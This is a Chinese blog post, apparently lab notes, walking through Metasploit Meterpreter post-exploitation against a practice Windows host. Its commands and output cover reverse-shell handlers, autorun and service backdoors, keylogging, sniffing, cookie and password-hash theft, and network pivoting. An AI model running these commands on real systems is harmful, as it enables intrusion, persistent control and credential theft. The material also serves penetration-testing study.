@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
+   
+  <meta name="description" content="一生努力" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Metasploit |  0Rld
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+</html>
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-Metasploit" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Metasploit
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/09/11/Metasploit/" class="article-date">
+  <time datetime="2020-09-11T10:55:45.000Z" itemprop="datePublished">2020-09-11</time>
+</a>
+      
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">11分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>主要介绍下Meterpreter攻击载荷模块</p>
+<h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h2><table>
+<thead>
+<tr>
+<th align="center"><strong>background</strong></th>
+<th align="center"><strong>将meterpreter隐藏在后台</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>sessions</strong></td>
+<td align="center"><strong>查看已经成功获取的会话</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>quit</strong></td>
+<td align="center"><strong>关闭meterpreter会话返回msf</strong></td>
+</tr>
+</tbody></table>
+<p><strong><img src="/2020/09/11/Metasploit/1.png" alt></strong></p>
+<h3 id="1-1文件系统命令"><a href="#1-1文件系统命令" class="headerlink" title="1.1文件系统命令"></a><strong>1.1文件系统命令</strong></h3><table>
+<thead>
+<tr>
+<th align="center"><strong>getwd</strong></th>
+<th align="center"><strong>目标机当前的工作目录</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>getlwd</strong></td>
+<td align="center"><strong>当前系统的工作目录</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>upload</strong></td>
+<td align="center"><strong>上传文件到目标机器</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>download</strong></td>
+<td align="center"><strong>从目标机器上下载文件（注意路径符号）</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>edit</strong></td>
+<td align="center"><strong>调用vi对目标机的文件进行编辑</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>search  -h</strong></td>
+<td align="center"><strong>文件搜索</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/2020/09/11/Metasploit/2.png" alt></p>
+<h3 id="1-2-网络命令"><a href="#1-2-网络命令" class="headerlink" title="1.2 网络命令"></a><strong>1.2 网络命令</strong></h3><p><strong>portfwd是端口转发命令，假设3389只允许内网访问，可用此命令进行端口转发，从而能直接访问目标主机</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span>  <span class="comment">#开启3389</span></span><br><span class="line">portfwd add <span class="literal">-l</span> <span class="number">1234</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.xx.xx</span><br><span class="line">root@kali:~/tools<span class="comment"># rdesktop -u admin -p 1234 127.0.0.1:1234</span></span><br><span class="line">route <span class="comment">#显示主机路由信息</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-系统命令"><a href="#1-3-系统命令" class="headerlink" title="1.3 系统命令"></a><strong>1.3 系统命令</strong></h3><table>
+<thead>
+<tr>
+<th align="center"><strong>ps</strong></th>
+<th align="left"><strong>显示目标主机上的进程</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>migrate    304</strong></td>
+<td align="left"><strong>可以将meterpreter会话从一个进程移植到另一个进程的内存空间（避免用户关闭进程终止会话连接，可以将进程移植到稳定的系统服务进程中，不需要断开已有的tcp连接） 这里的304是指进程的pid</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>getpid</strong></td>
+<td align="left"><strong>获取当前会话所在进程的PID值</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>getuid</strong></td>
+<td align="left"><strong>查看当前具有的权限</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>kill 1840</strong></td>
+<td align="left"><strong>结束目标进程</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>sysinfo</strong></td>
+<td align="left"><strong>查看目标系统信息</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>shutdown</strong></td>
+<td align="left"><strong>关闭目标主机</strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -f cmd.exe  #隐藏执行cmd.exe程序</span><br><span class="line">Process 2076 created.</span><br><span class="line">meterpreter &gt; execute -H -i -f   cmd.exe   #进行交互    </span><br><span class="line">Process 2740 created.                          </span><br><span class="line">Channel 1 created.                                                                     </span><br><span class="line">C:\&gt;whoami                                     </span><br><span class="line">execute -H -m -d normal.exe -f wce.exe -a "-o foo.txt" #wce.exe是攻击机上的可执行文件，后面是参数</span><br><span class="line"><span class="meta">#</span><span class="bash">-H 表示隐藏执行，-d 表示伪装在目标机器上的进程，-m支持直接从内存中执行攻击端的文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-后渗透攻击模块"><a href="#2-后渗透攻击模块" class="headerlink" title="2.后渗透攻击模块"></a><strong>2.后渗透攻击模块</strong></h2><p>主要步骤如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http                                                                                                                               </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span>                                                                                                                                                   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">1234</span>                                                                                                                              </span><br><span class="line">lport =&gt; <span class="number">1234</span>                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; run                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">[*] Started HTTP reverse handler on http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span>                                                                                                            </span><br><span class="line">[*] http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> handling request from <span class="number">192.168</span>.<span class="number">126.151</span>; (UUID: fop9sg                                                                                       hd) Staging x86 payload (<span class="number">181337</span> bytes) ...                                                                                                                                </span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> -&gt; <span class="number">192.168</span>.<span class="number">126.151</span>:<span class="number">1087</span>) at <span class="number">2</span>                                                                                       <span class="number">020</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">29</span> +<span class="number">0800</span>                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">meterpreter &gt; arp<span class="literal">-a</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过Persistence与metsvc等后渗透攻击模块，在目标主机上安装自启动和永久服务的方式，可以长久的控制目标主机！</p>
+<h3 id="2-1-persistence后渗透攻击模块"><a href="#2-1-persistence后渗透攻击模块" class="headerlink" title="2.1 persistence后渗透攻击模块"></a><strong>2.1 persistence后渗透攻击模块</strong></h3><p>运行后，会在目标主机的注册表键中添加键值，达到自启动的目的</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence <span class="literal">-X</span> <span class="literal">-i</span> <span class="number">5</span> <span class="literal">-p</span> <span class="number">443</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line"><span class="comment">#-X 表示开机自启动，-i表示反向连接的间隔时间</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/STU1_20200912.<span class="number">0938</span>/STU1_20200912.<span class="number">0938</span>.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">126.33</span> LPORT=<span class="number">443</span></span><br><span class="line">[*] Persistent agent script is <span class="number">99613</span> bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[+] Agent executed with PID <span class="number">1832</span></span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.126.33</span><br><span class="line">lhost =&gt; 192.168.126.33</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.33:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.126.151</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.33:443 -&gt; 192.168.126.151:1440) at 2020-09-12 16:49:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : STU1</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-metsvc后渗透攻击模块"><a href="#2-2-metsvc后渗透攻击模块" class="headerlink" title="2.2 metsvc后渗透攻击模块"></a><strong>2.2 metsvc后渗透攻击模块</strong></h3><p>主要是在目标主机的31337端口开启后门监听服务，并上传3个meterpreter模块</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Creating a meterpreter service on port <span class="number">31337</span></span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\dpcuvwyl...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc<span class="literal">-server</span>.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>
+
+<p>以上两个模块都容易被杀毒软件检测到，实用性不强，可上传免杀处理后的远程控制工具。</p>
+<h3 id="2-3-权限提升"><a href="#2-3-权限提升" class="headerlink" title="2.3 权限提升"></a><strong>2.3 权限提升</strong></h3><p>getsysytem  命令集成了四种权限提升技术</p>
+<p>分别利用了MS09-012和MS10-015、MS10-073、MS10-092中的漏洞 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/post/windows/escalate# ls</span><br><span class="line">droplnk.rb  getsystem.rb  golden_ticket.rb  ms10_073_kbdlayout.rb  screen_unlock.rb  unmarshal_cmd_exec.rb</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a><strong>2.4 信息获取</strong></h3><p><strong>dumplink模块：获取目标主机最近的系统操作、访问文件和office文档的操作记录</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/dumplinks </span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Running as SYSTEM extracting user list...</span><br><span class="line">[*] Extracting lnk files <span class="keyword">for</span> user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\<span class="number">01</span>.靶场夺旗第一关.pdf.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Chapter_1L.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\lab.txt.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk.</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>enum_applications模块：获取目标主机安装的软件、安全更新与漏洞补丁的信息</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications </span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on STU1</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2017 X86 Minimum Runtime - 14.16.27033     14.16.27033</span><br><span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                              69.0.1</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Notepad++ (32-bit x86)                                          7.7.1</span><br><span class="line"> Npcap 0.9983                                                    0.9983</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20200912201743_default_192.168.126.151_host.application_539875.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取键盘记录，从start开始记录</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;Left Windows&gt;ist mimi&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-5-口令获取和利用"><a href="#2-5-口令获取和利用" class="headerlink" title="2.5 口令获取和利用"></a><strong>2.5 口令获取和利用</strong></h3><p><strong>通过网络嗅探获取，在post/windows/gather/credentials目录下有许多这一块的攻击模块</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces <span class="comment">#获取网卡</span></span><br><span class="line"><span class="number">1</span> - <span class="string">'WAN Miniport (Network Monitor)'</span> ( type:<span class="number">3</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"><span class="number">2</span> - <span class="string">'Intel(R) PRO/1000 MT Network Connection'</span> ( type:<span class="number">0</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start <span class="number">1</span></span><br><span class="line">[*] Capture started on interface <span class="number">1</span> (<span class="number">50000</span> packet buffer)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_dump <span class="number">1</span> /root/xp1.cap <span class="comment">#保存在本地，再用wireshark分析</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface <span class="number">1</span>...</span><br><span class="line">[*] Flushed <span class="number">0</span> packets (<span class="number">0</span> bytes)</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /root/xp1.cap</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_stop <span class="number">1</span></span><br><span class="line">[*] Capture stopped on interface <span class="number">1</span></span><br><span class="line">[*] There are <span class="number">0</span> packets (<span class="number">0</span> bytes) remaining</span><br><span class="line">[*] Download or release them <span class="keyword">using</span> <span class="string">'sniffer_dump'</span> or <span class="string">'sniffer_release'</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>通过浏览器获取关键信息，如cookie、历史记录、密码等</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_ie </span><br><span class="line"></span><br><span class="line">[*] IE Version: <span class="number">8.0</span>.<span class="number">7601.17514</span></span><br><span class="line">[*] Retrieving history.....</span><br><span class="line">        File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</span><br><span class="line">        File: </span><br><span class="line">[*] Looping through history to find autocomplete data....</span><br><span class="line">[-] No autocomplete entries found <span class="keyword">in</span> registry</span><br><span class="line">[*] Looking <span class="keyword">in</span> the Credential Store <span class="keyword">for</span> HTTP Authentication Creds...</span><br><span class="line">[*] Writing history to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.history_734619.txt</span><br><span class="line">[*] Writing cookies to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.cookies_282520.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/smart_hashdump  <span class="comment">#获取系统口令的哈希值</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/<span class="number">20200912210516</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_windows.hashes_975340.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key <span class="keyword">using</span> SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[*]     No users with password hints on this system</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-6-内网拓展"><a href="#2-6-内网拓展" class="headerlink" title="2.6 内网拓展"></a><strong>2.6 内网拓展</strong></h3><p><strong>内网拓展功能，添加路由，将目标机器作为跳板机进入内网其它主机，有以下两种方式：</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                   </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; route add <span class="number">192.168</span>.<span class="number">52.0</span> <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">3</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print </span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">192.168</span>.<span class="number">52.0</span>       <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">3</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports <span class="number">445</span></span><br><span class="line">ports =&gt; <span class="number">445</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned  <span class="number">13</span> of <span class="number">128</span> hosts (<span class="number">10</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned <span class="number">128</span> of <span class="number">128</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>利用获取的口令进行传递攻击，如果密码一致，就可成功返回meterpreter会话：</strong></p>
